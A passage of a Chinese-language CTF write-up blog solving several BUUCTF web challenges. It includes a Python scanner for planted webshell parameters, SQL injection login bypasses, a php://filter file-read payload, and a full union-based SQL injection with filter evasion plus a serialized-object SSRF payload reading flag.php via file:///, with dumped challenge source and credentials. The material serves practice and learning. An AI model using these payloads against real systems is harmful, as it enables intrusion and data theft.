class=\"comment\"># params = &#123;&#125;</span></span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\\\\\"</span>+ target, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># 得到当前文件内所有的 GET 参数</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            params[param] = 'echo(\"2333\");'  # 将正则到的所有参数都加上参数</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Get:</span><br><span class=\"line\">            url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">            new_url = <span class=\"string\">\"%s%s?%s=%s\"</span> % (url, target_path, i, <span class=\"string\">'echo \"2333\"'</span>)</span><br><span class=\"line\">            r = requests.get(new_url)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># 带参数访问后检查是否有参数输出</span></span><br><span class=\"line\">                print(<span class=\"string\">\"++++++++++++++++++++++++++++GET find it! in \"</span> + target_path)</span><br><span class=\"line\">                result.append(target_path)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">\"GET No ! in \"</span> + target_path + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">                print(r.url + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">            r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(target_path)</span>:</span></span><br><span class=\"line\">    data = &#123;&#125;</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\\\\\"</span> + target_path, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># 得到当前文件内所有的 GET 参数</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            data[param] = 'print_r(\"2333\")'  # 将正则到的所有参数都加上参数</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">        r = requests.post(url + target_path, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># 带参数访问后检查是否有参数输出</span></span><br><span class=\"line\">            print(<span class=\"string\">\"++++++++++++++++++++++++++++POST find it! in \"</span> + target_path)</span><br><span class=\"line\">            result.append(target_path)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"POST No ! in \"</span> + target_path + <span class=\"string\">\"\\r\\n\"</span>)</span><br><span class=\"line\">        r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">t1 = datetime.now()</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(processes=<span class=\"number\">20</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> target_path:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        results = pool.apply_async(get, i)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(e)</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">'Multiprocess Scanning Completed in  '</span>, datetime.now() - t1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    get(target_path)</span><br><span class=\"line\">    post(target_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>提取完所有的 <code>GET和POST</code> 参数之后放在本地访问，如果我们加的参数成功 <code>echo</code> 了，说明找到可用 shell ，随后 <code>cat /flag</code> 即可。</p>\n<h3 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&apos; 123</span><br><span class=\"line\">to use near &apos;123&apos;&apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1   123</span><br><span class=\"line\">use near &apos; &apos; and password=&apos;123&apos; &apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1# 123</span><br></pre></td></tr></table></figure>\n\n<p>登陆就有flag.</p>\n<h3 id=\"Havefun\"><a href=\"#Havefun\" class=\"headerlink\" title=\"Havefun\"></a>Havefun</h3><p>查看源码发现</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$cat=$_GET[<span class=\"string\">'cat'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $cat;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($cat==<span class=\"string\">'dog'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>GET</code>传参</p>\n<h3 id=\"Secret-File\"><a href=\"#Secret-File\" class=\"headerlink\" title=\"Secret File\"></a>Secret File</h3><p><strong>F12</strong>打开开发者工具，监视网络，发现在连续的三个页面中间有一个302跳转，我们抓包之后发现跳转页面的注释中给了一个文件名 <code>secr3t.php</code> ,访问得到代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">    $file=$_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($file,<span class=\"string\">\"../\"</span>)||stristr($file, <span class=\"string\">\"tp\"</span>)||stristr($file,<span class=\"string\">\"input\"</span>)||stristr($file,<span class=\"string\">\"data\"</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Oh no!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file); </span><br><span class=\"line\"><span class=\"comment\">//flag放在了flag.php里</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>php 伪协议读文件之后再解码即可：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网鼎杯-Fakebook\"><a href=\"#网鼎杯-Fakebook\" class=\"headerlink\" title=\"网鼎杯-Fakebook\"></a>网鼎杯-Fakebook</h3><p>扫目录得到 robots.txt </p>\n<p><code>/user.php.bak</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看起来像 SSRF ，又有序列化。</p>\n<h4 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h4><p><code>Join</code> 页面 <code>sqlmap</code> 试出来 <code>username</code> 有 POST 注入，存的数据是序列化之后的用户信息。</p>\n<p>注册登录之后查看 BLOG 内容页面发现 <code>no</code> 参数可能存在注入：</p>\n<p><code>http://buuoj.cn/view.php?no=1 and 1=1#</code></p>\n<p><code>正常</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 and 1=2#</code></p>\n<p><code>报错 Notice: Trying to get property of non-object in /var/www/html/view.php on line 53</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 order by 5#</code></p>\n<p><code>*] query error! (Unknown column &#39;5&#39; in &#39;order clause&#39;)</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1 union select 1,2,3,4#</code></p>\n<p><code>有过滤：no hack ~_~</code></p>\n<p><code>.node3.buuoj.cn/view.php?no=-1 union/**/select 1,2,3,4#</code></p>\n<p><code>找到回显位在 2</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(schema_name),3,4 from information_schema.schemata--+</code></p>\n<p><code>fakebook,information_schema,mysql,performance_schema,test</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;--+</code></p>\n<p><code>users</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>\n<p><code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(data,username,passwd),3,4 from users--+</code></p>\n<p><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;goya&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;}goyaed12c3322e527f073f9159f257dfcc7db08c86ec11388c76b6c5009b06aa33ecd6bfab7d74151ba3f0c50ef1938c03134762c9e435cc88db39c53114ed2a2b14</code></p>\n<p>序列化存储 <code>data</code></p>\n<p>结合上面的代码我们可以知道下面的代码即可读取 flag ：</p>\n<p><code>?no=0 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p>\n<p>顺便读一下 <code>view.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php session_start(); ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;db.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;user.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;error.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$db = new DB();</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;ko&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot;</span><br><span class=\"line\">          content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;User&lt;/title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;?php require_once &apos;bootstrap.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$no = $_GET[&apos;no&apos;];</span><br><span class=\"line\">if ($db-&gt;anti_sqli($no))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    die(&quot;no hack ~_~&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$res = $db-&gt;getUserByNo($no);</span><br><span class=\"line\">$user = unserialize($res[&apos;data&apos;]);</span><br><span class=\"line\">//print_r($res);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;table class=&quot;table&quot;&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                username</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                age</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                blog</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $res[&apos;username&apos;]; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $user-&gt;age; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo xss($user-&gt;blog); ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">    &lt;/table&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">    $response = $user-&gt;getBlogContents();</span><br><span class=\"line\">    if ($response === 404)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &quot;404 Not found&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $base64 = base64_encode($response);</span><br><span class=\"line\">        echo &quot;&lt;iframe width=&apos;100%&apos; height=&apos;10em&apos; src=&apos;data:text/html;base64,&#123;$base64&#125;&apos;&gt;&quot;;</span><br><span class=\"line\">        // echo $response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // var_dump($user-&gt;getBlogContents());</span><br><span class=\"line\">    ?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>db.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &apos;lib.php&apos;;</span><br><span class=\"line\">$mysqli = new mysqli(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;naiwjebfahjebfja&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">class DB &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction __construct() &#123;</span><br><span class=\"line\">\t\t// $mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;!@#1234!@#&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function isValidUsername($username) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res-&gt;fetch_array()) &#123;</span><br><span class=\"line\">\t\t\treturn 1;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction login($username, $passwd) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos; and passwd = &apos;&#123;$passwd&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_array();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction insertUser($username, $passwd, $data) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = substr($username, 0, 100);</span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$data = serialize($data);</span><br><span class=\"line\">\t\t$data = addslashes($data);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;insert into users (username, passwd, data) values (&apos;&#123;$username&#125;&apos;, &apos;&#123;$passwd&#125;&apos;, &apos;&#123;$data&#125;&apos;)&quot;;</span><br><span class=\"line\">\t\treturn $mysqli-&gt;real_query($query);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getAllUsers() &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;select * from users&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\treturn $res-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getUserByNo($no) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// $no = addslashes($no);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where no = &#123;$no&#125;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res) &#123;</span><br><span 